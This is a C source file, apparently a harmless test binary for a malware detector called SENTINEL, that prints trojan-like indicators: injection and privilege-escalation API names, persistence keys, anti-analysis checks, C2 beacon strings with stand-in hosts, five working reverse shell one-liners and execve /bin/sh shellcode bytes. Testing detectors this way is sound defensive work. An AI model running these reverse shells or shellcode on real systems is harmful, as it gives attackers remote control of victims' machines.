/**
 * SENTINEL Test Binary - Trojan/Backdoor Simulation
 * 
 * This is a SAFE test binary that contains patterns commonly found in trojans
 * and backdoors to test detection capabilities. It doesn't open any backdoors.
 * 
 * Detection patterns:
 * - Reverse shell commands
 * - Process injection APIs
 * - DLL injection patterns
 * - C2 communication
 * - Privilege escalation
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// Process injection APIs
const char* injection_apis[] = {
    "VirtualAllocEx",
    "WriteProcessMemory",
    "CreateRemoteThread",
    "NtCreateThreadEx",
    "RtlCreateUserThread",
    "QueueUserAPC",
    "SetThreadContext",
    "NtUnmapViewOfSection",
    "NtMapViewOfSection"
};

// DLL injection techniques
const char* dll_injection_methods[] = {
    "CreateRemoteThread + LoadLibraryA",
    "NtCreateThreadEx + LoadLibrary",
    "SetWindowsHookEx",
    "QueueUserAPC",
    "Reflective DLL Injection",
    "Process Hollowing",
    "Thread Execution Hijacking",
    "AtomBombing"
};

// Privilege escalation APIs
const char* privesc_apis[] = {
    "AdjustTokenPrivileges",
    "LookupPrivilegeValueA",
    "OpenProcessToken",
    "DuplicateTokenEx",
    "ImpersonateLoggedOnUser",
    "CreateProcessAsUserA",
    "CreateProcessWithTokenW",
    "SeDebugPrivilege",
    "SeTcbPrivilege"
};

// Reverse shell commands
const char* reverse_shells[] = {
    "nc -e /bin/bash 192.168.1.100 4444",
    "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
    "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"192.168.1.100\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('192.168.1.100',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($o)),0,$o.Length)}\"",
    "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass -file \\\\attacker\\share\\payload.ps1\"\", 0:close\")"
};

// Bind shell ports
const char* common_backdoor_ports[] = {
    "4444",   // Metasploit default
    "5555",   // Common RAT
    "6666",   // Backdoor
    "31337",  // Elite/leet port
    "12345",  // NetBus
    "27374",  // SubSeven
    "1234",   // Common
    "8080"    // HTTP alternate
};

// C2 beacon patterns
const char* c2_patterns[] = {
    "GET /beacon HTTP/1.1",
    "POST /upload HTTP/1.1",
    "Cookie: SESSIONID=",
    "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0)",
    "X-Forwarded-For: ",
    "GET /commands?id=",
    "POST /exfil HTTP/1.1"
};

// C2 server addresses (fake)
const char* c2_servers[] = {
    "evil-c2.xyz",
    "192.168.1.100",
    "10.0.0.50",
    "command.darkweb.onion",
    "malware-control.net"
};

// Anti-analysis techniques
const char* anti_analysis[] = {
    "IsDebuggerPresent",
    "CheckRemoteDebuggerPresent",
    "NtQueryInformationProcess",
    "OutputDebugStringA",
    "GetTickCount timing check",
    "CPUID VM detection",
    "Registry: HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0",
    "Process: vmtoolsd.exe, vmwaretray.exe",
    "MAC address: 00:0C:29, 00:50:56, 08:00:27"
};

// Persistence mechanisms
const char* persistence[] = {
    "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    "Scheduled Task: schtasks /create",
    "WMI Event Subscription",
    "DLL Search Order Hijacking",
    "Service: sc create malware_svc",
    "Startup Folder: %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
};

// Shellcode-like pattern (NOP sled + fake payload header)
unsigned char fake_shellcode[] = {
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,  // NOP sled
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x31, 0xc0,                                       // xor eax, eax
    0x50,                                             // push eax
    0x68, 0x2f, 0x2f, 0x73, 0x68,                    // push "//sh"
    0x68, 0x2f, 0x62, 0x69, 0x6e,                    // push "/bin"
    0x89, 0xe3,                                       // mov ebx, esp
    0x50,                                             // push eax
    0x53,                                             // push ebx
    0x89, 0xe1,                                       // mov ecx, esp
    0x99,                                             // cdq
    0xb0, 0x0b,                                       // mov al, 11 (execve)
    0xcd, 0x80                                        // int 0x80
};

void print_banner(void) {
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════════╗\n");
    printf("║     SENTINEL TEST - TROJAN/BACKDOOR SIMULATION                    ║\n");
    printf("║                                                                   ║\n");
    printf("║  This binary simulates trojan patterns but is COMPLETELY SAFE.    ║\n");
    printf("║  It does NOT open any backdoors or inject into processes.         ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════╝\n");
    printf("\n");
}

void simulate_injection(void) {
    printf("[*] Would use process injection APIs:\n");
    for (int i = 0; i < 5; i++) {
        printf("    - %s\n", injection_apis[i]);
    }
    
    printf("\n[*] DLL injection methods known:\n");
    for (int i = 0; i < 4; i++) {
        printf("    - %s\n", dll_injection_methods[i]);
    }
}

void simulate_privilege_escalation(void) {
    printf("\n[*] Would use privilege escalation APIs:\n");
    for (int i = 0; i < 5; i++) {
        printf("    - %s\n", privesc_apis[i]);
    }
}

void simulate_reverse_shell(void) {
    printf("\n[*] Reverse shell payloads (embedded):\n");
    printf("────────────────────────────────────────\n");
    printf("%s\n", reverse_shells[0]);
    printf("────────────────────────────────────────\n");
    
    printf("\n[*] Would connect back to port: %s\n", common_backdoor_ports[0]);
}

void simulate_c2_communication(void) {
    printf("\n[*] C2 server: %s\n", c2_servers[0]);
    printf("[*] Beacon pattern:\n");
    printf("    %s\n", c2_patterns[0]);
    printf("    Host: %s\n", c2_servers[0]);
}

void simulate_anti_analysis(void) {
    printf("\n[*] Anti-analysis techniques:\n");
    for (int i = 0; i < 5; i++) {
        printf("    - %s\n", anti_analysis[i]);
    }
}

void simulate_persistence(void) {
    printf("\n[*] Persistence mechanisms:\n");
    for (int i = 0; i < 4; i++) {
        printf("    - %s\n", persistence[i]);
    }
}

void print_shellcode_info(void) {
    printf("\n[*] Embedded shellcode pattern (%zu bytes):\n", sizeof(fake_shellcode));
    printf("    ");
    for (size_t i = 0; i < sizeof(fake_shellcode) && i < 20; i++) {
        printf("%02x ", fake_shellcode[i]);
    }
    printf("...\n");
}

int main(void) {
    print_banner();
    
    simulate_injection();
    simulate_privilege_escalation();
    simulate_reverse_shell();
    simulate_c2_communication();
    simulate_anti_analysis();
    simulate_persistence();
    print_shellcode_info();
    
    printf("\n[✓] Trojan/backdoor simulation complete.\n");
    printf("[✓] This was a SAFE test - no backdoors were opened.\n\n");
    
    return 0;
}
